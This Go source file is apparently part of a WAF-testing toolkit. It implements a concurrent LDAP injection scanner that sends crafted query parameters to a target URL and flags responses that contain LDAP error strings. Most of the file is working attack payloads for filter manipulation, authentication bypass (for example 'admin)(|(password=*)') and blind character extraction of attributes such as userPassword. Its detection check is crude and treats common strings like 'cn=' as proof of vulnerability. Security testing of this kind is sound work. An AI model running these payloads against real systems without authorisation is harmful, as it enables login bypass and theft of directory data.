// Package ldap provides LDAP injection testing
package ldap

import (
	"context"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
)

// Config configures LDAP injection testing
type Config struct {
	attackconfig.Base
	Headers map[string]string
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Base: attackconfig.Base{
			Concurrency: defaults.ConcurrencyMedium,
			Timeout:     httpclient.TimeoutProbing,
		},
	}
}

// Result represents an LDAP injection test result
type Result struct {
	URL          string
	Parameter    string
	Payload      string
	StatusCode   int
	ResponseSize int
	Vulnerable   bool
	Evidence     string
	Severity     string
	Timestamp    time.Time
}

// Scanner performs LDAP injection testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new LDAP injection scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = defaults.ConcurrencyMedium
	}
	if config.Timeout <= 0 {
		config.Timeout = httpclient.TimeoutProbing
	}

	return &Scanner{
		config:  config,
		client:  httpclient.Default(),
		results: make([]Result, 0),
	}
}

// Scan tests a URL for LDAP injection
func (s *Scanner) Scan(ctx context.Context, targetURL string, params map[string]string) ([]Result, error) {
	results := make([]Result, 0)

	for param, value := range params {
		for _, payload := range Payloads() {
			select {
			case <-ctx.Done():
				return results, ctx.Err()
			default:
			}

			testParams := make(map[string]string)
			for k, v := range params {
				testParams[k] = v
			}
			testParams[param] = value + payload

			result := s.testPayload(ctx, targetURL, param, payload, testParams)
			if result.Vulnerable {
				results = append(results, result)
				s.config.NotifyVulnerabilityFound()
			}
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// testPayload tests a single LDAP injection payload
func (s *Scanner) testPayload(ctx context.Context, targetURL, param, payload string, params map[string]string) Result {
	result := Result{
		URL:       targetURL,
		Parameter: param,
		Payload:   payload,
		Timestamp: time.Now(),
	}

	// Build URL with params
	u, err := url.Parse(targetURL)
	if err != nil {
		return result
	}

	q := u.Query()
	for k, v := range params {
		q.Set(k, v)
	}
	u.RawQuery = q.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
	if err != nil {
		return result
	}

	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	// Check for LDAP injection indicators
	result.Vulnerable, result.Evidence = s.detectVulnerability(string(body))
	if result.Vulnerable {
		result.Severity = "HIGH"
	}

	return result
}

// detectVulnerability checks response for LDAP injection indicators
func (s *Scanner) detectVulnerability(body string) (bool, string) {
	bodyLower := strings.ToLower(body)

	// LDAP error patterns
	errorPatterns := []string{
		"ldap_",
		"ldap error",
		"ldap://",
		"invalid dn syntax",
		"object class violation",
		"naming violation",
		"constraint violation",
		"no such object",
		"ldapsearch",
		"ldapadd",
		"ldapmodify",
		"active directory",
		"cn=",
		"dc=",
		"ou=",
		"uid=",
		"objectclass",
	}

	for _, pattern := range errorPatterns {
		if strings.Contains(bodyLower, pattern) {
			return true, "LDAP error pattern detected: " + pattern
		}
	}

	return false, ""
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns LDAP injection payloads
func Payloads() []string {
	return []string{
		// Basic LDAP injection
		"*",
		"*)(uid=*))(|(uid=*",
		"*)(objectClass=*",
		"*)(|(objectClass=*",

		// Authentication bypass
		"admin)(&)",
		"admin)(|(password=*)",
		"*)(uid=*))(|(uid=*",
		"*)(&(objectClass=*",

		// Blind LDAP injection
		"*)(cn=*",
		"*)(sn=*",
		"*)(givenName=*",

		// Filter manipulation
		")(cn=*)(|(cn=*",
		")(objectClass=*",
		"*)(|(mail=*",

		// Escape characters
		"\\00",
		"\\2a",
		"\\28",
		"\\29",
		"\\5c",

		// NULL byte
		"*)\x00",
		"admin\x00",

		// Logic manipulation
		"*))%00",
		"admin))(&(",
		"*)(|(",
		"*)(uid=*))(|(uid=*",

		// Time-based
		"*)(uid=*)(|(uid=*)(uid=*)(uid=*)(uid=*)(uid=*",

		// DN manipulation
		"*,dc=*",
		"*,ou=*",
		"*,cn=*",
	}
}

// BlindPayloads returns blind LDAP injection payloads
func BlindPayloads() []string {
	return []string{
		// Character extraction
		"*)(uid=a*",
		"*)(uid=b*",
		"*)(uid=admin*",

		// Boolean-based
		"admin)(|(1=1",
		"admin)(|(1=0",

		// Comparison-based
		"*)(userPassword=*",
		"*)(cn>=a",
		"*)(cn<=z",
	}
}

// AuthBypassPayloads returns authentication bypass payloads
func AuthBypassPayloads() []string {
	return []string{
		"*",
		"admin*",
		"*)(uid=*",
		"admin)(&)",
		"*)(objectClass=*",
		"admin)(|(uid=*)(userPassword=*",
		"*))%00",
	}
}
